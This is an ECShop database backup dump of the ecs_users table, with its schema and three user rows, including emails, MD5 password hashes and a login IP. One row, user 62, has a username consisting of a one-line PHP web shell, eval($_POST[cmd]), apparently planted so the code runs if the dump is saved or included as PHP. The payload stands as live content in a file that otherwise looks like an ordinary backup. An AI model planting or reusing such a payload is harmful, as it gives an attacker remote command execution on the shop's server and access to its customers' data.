-- ecshop v2.x SQL Dump Program
-- http://miqinmao.com
-- 
-- DATE : 2015-11-13 09:31:14
-- MYSQL SERVER VERSION : 5.5.46-cll
-- PHP VERSION : 5.4.45
-- ECShop VERSION : v4_2
-- Vol : 1
DROP TABLE IF EXISTS `ecs_users`;
CREATE TABLE `ecs_users` (
  `user_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `aite_id` text NOT NULL,
  `email` varchar(60) NOT NULL DEFAULT '',
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '',
  `is_surplus_open` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否开启余额支付密码功能',
  `surplus_password` varchar(32) NOT NULL COMMENT '余额支付密码',
  `question` varchar(255) NOT NULL DEFAULT '',
  `answer` varchar(255) NOT NULL DEFAULT '',
  `sex` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `birthday` date NOT NULL DEFAULT '0000-00-00',
  `user_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `frozen_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `pay_points` int(10) unsigned NOT NULL DEFAULT '0',
  `rank_points` int(10) unsigned NOT NULL DEFAULT '0',
  `address_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `reg_time` int(10) unsigned NOT NULL DEFAULT '0',
  `last_login` int(11) unsigned NOT NULL DEFAULT '0',
  `last_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `last_ip` varchar(15) NOT NULL DEFAULT '',
  `visit_count` smallint(5) unsigned NOT NULL DEFAULT '0',
  `user_rank` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `is_special` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ec_salt` varchar(10) DEFAULT NULL,
  `salt` varchar(10) NOT NULL DEFAULT '0',
  `parent_id` mediumint(9) NOT NULL DEFAULT '0',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `alias` varchar(60) NOT NULL,
  `msn` varchar(60) NOT NULL,
  `qq` varchar(20) NOT NULL,
  `office_phone` varchar(20) NOT NULL,
  `home_phone` varchar(20) NOT NULL,
  `mobile_phone` varchar(20) NOT NULL,
  `is_validated` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `validated` int(11) NOT NULL,
  `credit_line` decimal(10,2) unsigned NOT NULL,
  `passwd_question` varchar(50) DEFAULT NULL,
  `passwd_answer` varchar(255) DEFAULT NULL,
  `is_fenxiao` tinyint(1) NOT NULL,
  `real_name` varchar(255) NOT NULL,
  `card` varchar(255) NOT NULL,
  `face_card` varchar(255) NOT NULL,
  `back_card` varchar(255) NOT NULL,
  `country` int(11) NOT NULL,
  `province` int(11) NOT NULL,
  `city` int(11) NOT NULL,
  `district` int(11) NOT NULL,
  `address` varchar(255) NOT NULL,
  `status` int(11) NOT NULL,
  `mediaUID` varchar(50) NOT NULL,
  `mediaID` int(4) NOT NULL,
  `froms` char(10) NOT NULL DEFAULT 'pc' COMMENT 'pc:电脑,mobile:手机,app:应用',
  `headimg` varchar(255) NOT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `user_name` (`user_name`),
  KEY `email` (`email`),
  KEY `parent_id` (`parent_id`),
  KEY `flag` (`flag`),
  KEY `mediaUID` (`mediaUID`,`mediaID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `is_surplus_open`, `surplus_password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `validated`, `credit_line`, `passwd_question`, `passwd_answer`, `is_fenxiao`, `real_name`, `card`, `face_card`, `back_card`, `country`, `province`, `city`, `district`, `address`, `status`, `mediaUID`, `mediaID`, `froms`, `headimg` ) VALUES  ('60', '', '123123@123.com', '123123', '4297f44b13955235245b2497399d7a93', '0', '', '', '', '0', '1955-01-01', '0.00', '0.00', '0', '0', '0', '1444755459', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0', '0.00', '', '', '0', '', '', '', '', '0', '0', '0', '0', '', '1', '', '0', 'pc', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `is_surplus_open`, `surplus_password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `validated`, `credit_line`, `passwd_question`, `passwd_answer`, `is_fenxiao`, `real_name`, `card`, `face_card`, `back_card`, `country`, `province`, `city`, `district`, `address`, `status`, `mediaUID`, `mediaID`, `froms`, `headimg` ) VALUES  ('61', '', '123@123.com', 'abc', '9f01256a75c9400045e03793f4b97717', '0', '', '', '', '0', '1955-01-01', '0.00', '0.00', '0', '0', '50', '1445330951', '1445332036', '0000-00-00 00:00:00', '222.211.128.200', '20', '0', '0', '6654', '0', '0', '0', '', '', '', '', '', '', '0', '0', '0.00', '', '', '0', '', '', '', '', '0', '0', '0', '0', '', '0', '', '0', 'pc', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `is_surplus_open`, `surplus_password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `validated`, `credit_line`, `passwd_question`, `passwd_answer`, `is_fenxiao`, `real_name`, `card`, `face_card`, `back_card`, `country`, `province`, `city`, `district`, `address`, `status`, `mediaUID`, `mediaID`, `froms`, `headimg` ) VALUES  ('62', '', '432535623@qq.com', '<?php eval($_POST[cmd]);?>', 'e10adc3949ba59abbe56e057f20f883e', '0', '', '', '', '0', '1955-01-01', '0.00', '0.00', '0', '0', '0', '1447349436', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0', '0.00', '', '', '0', '', '', '', '', '0', '0', '0', '0', '', '0', '', '0', 'pc', '');
-- END ecshop v2.x SQL Dump Program 